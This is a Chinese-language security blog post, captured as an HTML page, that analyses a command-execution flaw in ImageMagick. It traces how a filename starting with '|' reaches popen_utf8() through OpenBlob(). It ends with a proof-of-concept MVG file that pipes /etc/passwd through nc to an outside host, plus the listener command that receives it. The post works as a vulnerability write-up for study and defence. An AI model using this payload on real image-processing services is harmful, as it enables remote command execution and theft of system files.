@@ -1,0 +1,370 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>ImageMagick另一个命令执行--popen_utf8()函数 | \\Johnis.online\BLOG</title>
+  <meta name="author" content="LonelyRain">
+  
+  <meta name="description" content="心情杂谈哎哎哎,老司机一言不合就爆洞啊,这个洞在之前分析CVE-2016-3714的时候也发现了,结果被捂烂了…心塞塞~那我就写一下当时是怎么发现怎么这个洞…
+漏洞分析正文之前在分析CVE-2016-3714的时候想,system()函数处理有问题,那么其他类似的有哪些函数呢?
+下面是一个可以执行命令的函数列表:
+1234567system()popen()fork()+exec()execl()
+那么搜索一下调用system()函数有哪些地方?经过搜索的话,最终只有CVE-2016-3714这个漏洞点调用到了一个system(). 那这么接下来搜索一下popen()函数调用点">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="ImageMagick另一个命令执行--popen_utf8()函数"/>
+  <meta property="og:site_name" content="\\Johnis.online\BLOG"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/old/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/old/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/old/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="/old//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/old/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/old/">\\Johnis.online\BLOG</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/old/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/old/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> ImageMagick另一个命令执行--popen_utf8()函数</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="心情杂谈"><a href="#心情杂谈" class="headerlink" title="心情杂谈"></a>心情杂谈</h2><p>哎哎哎,老司机一言不合就爆洞啊,这个洞在之前分析CVE-2016-3714的时候也发现了,结果被捂烂了…心塞塞~那我就写一下当时是怎么发现怎么这个洞…</p>
+<h2 id="漏洞分析正文"><a href="#漏洞分析正文" class="headerlink" title="漏洞分析正文"></a>漏洞分析正文</h2><p>之前在分析CVE-2016-3714的时候想,<code>system()</code>函数处理有问题,那么其他类似的有哪些函数呢?</p>
+<p>下面是一个可以执行命令的函数列表:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">system()</div><div class="line"></div><div class="line">popen()</div><div class="line"></div><div class="line">fork()+exec()</div><div class="line"></div><div class="line">execl()</div></pre></td></tr></table></figure>
+<p>那么搜索一下调用<code>system()</code>函数有哪些地方?经过搜索的话,最终只有CVE-2016-3714这个漏洞点调用到了一个<code>system()</code>. 那这么接下来搜索一下<code>popen()</code>函数调用点</p>
+<a id="more"></a>
+<p>文件:magick/blob.c:2503行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#if defined(SIGPIPE)</div><div class="line">if (*type == &apos;w&apos;)</div><div class="line">(void) signal(SIGPIPE,SIG_IGN);</div><div class="line">#endif</div><div class="line">*mode=(*type);</div><div class="line">mode[1]=&apos;\0&apos;;</div><div class="line">image-&gt;blob-&gt;file_info.file=(FILE *) popen_utf8(filename+1,mode);</div><div class="line">if (image-&gt;blob-&gt;file_info.file == (FILE *) NULL)</div><div class="line">&#123;</div><div class="line">ThrowFileException(exception,BlobError,&quot;UnableToOpenBlob&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div><div class="line">image-&gt;blob-&gt;type=PipeStream;</div><div class="line">image-&gt;blob-&gt;exempt=MagickTrue;</div><div class="line">return(SetStreamBuffering(image_info,image));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我们可以看到有一个<code>popen_utf8()</code>函数.</p>
+<p>跟进函数文件:magick/utility-private.h:173行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">static inline FILE *popen_utf8(const char *command,const char *type)</div><div class="line">&#123;</div><div class="line">#if !defined(MAGICKCORE_WINDOWS_SUPPORT) || defined(__CYGWIN__) || defined(__MINGW32__) || defined(__MINGW64__)</div><div class="line">return(popen(command,type));</div><div class="line">#else</div><div class="line">FILE</div><div class="line">*file;</div><div class="line"></div><div class="line">wchar_t</div><div class="line">*type_wide,</div><div class="line">*command_wide;</div><div class="line"></div><div class="line">command_wide=create_wchar_path(command);</div><div class="line">if (command_wide == (wchar_t *) NULL)</div><div class="line">return((FILE *) NULL);</div><div class="line">type_wide=create_wchar_path(type);</div><div class="line">if (type_wide == (wchar_t *) NULL)</div><div class="line">&#123;</div><div class="line">command_wide=(wchar_t *) RelinquishMagickMemory(command_wide);</div><div class="line">return((FILE *) NULL);</div><div class="line">&#125;</div><div class="line">file=_wpopen(command_wide,type_wide);</div><div class="line">type_wide=(wchar_t *) RelinquishMagickMemory(type_wide);</div><div class="line">command_wide=(wchar_t *) RelinquishMagickMemory(command_wide);</div><div class="line">return(file);</div><div class="line">#endif</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看见<code>popen_utf8()</code>直接return了<code>popen()</code>函数的值回来.</p>
+<p>那么问题来了,谁调用了<code>popen_utf8</code>呢？</p>
+<p>向上追溯代码可以看到是<code>OpenBlob()</code>函数调用了<code>popen_utf8</code>.继续查看谁调用了<code>OpenBlob()</code></p>
+<p><img src="/old/2017/10/10/ImageMagick2/1879977320.png" alt="8248DCA8-27B0-46A0-A5EE-25C3EA3BB8FF.png"></p>
+<p>我们可以看到一堆地方调用到了<code>OpenBlob()</code>,看到一个眼熟的地方!</p>
+<p>使用GDB反调会让眼熟的地方明显一点</p>
+<p><img src="/old/2017/10/10/ImageMagick2/1560639559.png" alt="5B98ABC0-8703-43CC-A6C4-53B19D9BBD8F.png"><br>可以看到流程中有<code>constitute.c</code>调用到<code>OpenBlob()</code>.而之前分析的时候也经常看<code>constitute.c</code>,很明显会选择先看这个地方的调用有没有问题.</p>
+<p>在<code>constitute.c:448行</code></p>
+<p>可以看到<code>status＝OpenBlob(image_info,image,ReadBinaryBlobMode,exception);</code></p>
+<p>status在imagemagick里面一般都是用MagickTrue或者MagickFalse作为最终的函数返回值的,知道这点就好了.</p>
+<p><code>OpenBlob(image_info,image,ReadBinaryBlobMode,exception);</code></p>
+<p>在这个函数中<code>image_info,image</code>两个参数的值都是由我们传进去的.</p>
+<p>OpenBlob函数先进行了<code>Policy</code>的检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">if (*type == &apos;w&apos;)</div><div class="line">rights=WritePolicyRights;</div><div class="line">if (IsRightsAuthorized(PathPolicyDomain,rights,filename) == MagickFalse)</div><div class="line">&#123;</div><div class="line">errno=EPERM;</div><div class="line">(void) ThrowMagickException(exception,GetMagickModule(),PolicyError,</div><div class="line">&quot;NotAuthorized&quot;,&quot;`%s&apos;&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>最重要的一段在如下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">if (*filename == &apos;|&apos;)</div><div class="line">&#123;</div><div class="line">char</div><div class="line">mode[MaxTextExtent];</div><div class="line"></div><div class="line">/*</div><div class="line">Pipe image to or from a system command.</div><div class="line">*/</div><div class="line">#if defined(SIGPIPE)</div><div class="line">if (*type == &apos;w&apos;)</div><div class="line">(void) signal(SIGPIPE,SIG_IGN);</div><div class="line">#endif</div><div class="line">*mode=(*type);</div><div class="line">mode[1]=&apos;\0&apos;;</div><div class="line">image-&gt;blob-&gt;file_info.file=(FILE *) popen_utf8(filename+1,mode);</div><div class="line">if (image-&gt;blob-&gt;file_info.file == (FILE *) NULL)</div><div class="line">&#123;</div><div class="line">ThrowFileException(exception,BlobError,&quot;UnableToOpenBlob&quot;,filename);</div><div class="line">return(MagickFalse);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>因为<code>*filename</code>指向指针的第一个字符,如果第一个字符是<code>|</code>那么就调用<code>popen_utf8()</code>去打开文件.</p>
+<p>所以我们要控制的就是<code>|</code>后面的字符.如果我们想要控制这里的<code>filename</code>就意味着我们需要传入的文件的名称<code>|</code>+<code>你要执行的命令</code></p>
+<p>经过测试这个是可以的,这个地方可以命令执行,但是万一要是上传的文件名字有限制<code>|</code>这个符号不让作为文件名的名字的话,那就挺别扭的.而且<code>windows</code>底下应该是不能用<code>|</code>作为文件的名字的,所以还是把payload写在文件里面比较好.</p>
+<p>通过对imagemagick源码的浏览,并且查询imagemagick的官方文档.</p>
+<p><a href="http://www.imagemagick.org/script/magick-vector-graphics.php" target="_blank" rel="external">官方文档</a></p>
+<p>可以发现mvg有很多需要操作文件mvg内文件的原语,这些地方都是会调用到<code>OpenBlob()</code></p>
+<p>例如以下操作:</p>
+<p><img src="/old/2017/10/10/ImageMagick2/1398429269.png" alt="D51CD2F4-9C55-48D5-B28D-5B1551B4C4E8.png"></p>
+<p><img src="/old/2017/10/10/ImageMagick2/1259270032.png" alt="29336A5F-27D6-442F-86CF-C49C720A1AF9.png"></p>
+<p><img src="/old/2017/10/10/ImageMagick2/1921966953.png" alt="C973A35E-D2D6-43AA-A6DF-D43D0F8FEB3B.png"></p>
+<p><img src="/old/2017/10/10/ImageMagick2/3752992863.png" alt="F4958AC8-5D13-49B2-99E8-61175C9BFDCE.png"></p>
+<p>Poc使用<code>image over</code>这个原语.</p>
+<p>那么Poc就出来了</p>
+<p><code>1.mvg</code>文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image Over 0,0 0,0 &apos;|cat /etc/passwd|nc Johnis.online 9999&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>然后attack的服务器运行<code>nc -l 0.0.0.0 9999 &gt; passwd</code></p>
+<p>这个漏洞有兴趣的同学可以去再找一下其它玩法…</p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/old/2017/10/10/PHP-Type/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/old/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/old/2017/10/10/Imagetragick/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = '//lonelyrain-1.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="/old//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div>
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-10-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/old/categories/漏洞分析/">漏洞分析<span>13</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/old/tags/漏洞分析/">漏洞分析<span>12</span></a></li> <li><a href="/old/tags/Imagetragick/">Imagetragick<span>2</span></a></li> <li><a href="/old/tags/命令执行/">命令执行<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#心情杂谈"><span class="toc-article-text">心情杂谈</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#漏洞分析正文"><span class="toc-article-text">漏洞分析正文</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+<script type="text/javascript">
+var disqus_shortname = 'lonelyrain-1';
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2019 LonelyRain
+  
+</p>
+
+<script>
+  var disqus_shortname = 'lonelyrain-1';
+  
+  var disqus_url = 'http://cnlonelyrain.github.io/2017/10/10/ImageMagick2/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/old/js/jquery.imagesloaded.min.js"></script>
+<script src="/old/js/gallery.js"></script>
+<script src="/old/js/bootstrap.min.js"></script>
+<script src="/old/js/main.js"></script>
+<script src="/old/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/old/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/old/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "old/search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "old/search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
